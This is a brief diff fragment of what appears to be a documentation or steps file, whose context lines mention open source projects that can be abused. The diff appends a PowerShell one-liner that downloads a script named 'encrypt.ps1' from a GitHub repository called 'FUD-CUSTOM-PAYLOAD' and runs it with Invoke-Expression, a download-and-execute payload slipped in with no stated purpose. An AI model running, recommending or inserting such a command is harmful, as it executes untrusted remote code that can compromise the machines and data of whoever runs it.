@@ -14,3 +14,7 @@ STEPS:
  These are the pillars for higher learning, 
  but have often been used to describe some open source projects 
  and services that have the potential to be abused by those that are not so innocent.
+
+
+ 
+powershell start powershell -A 'Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/encrypt.ps1).Content'
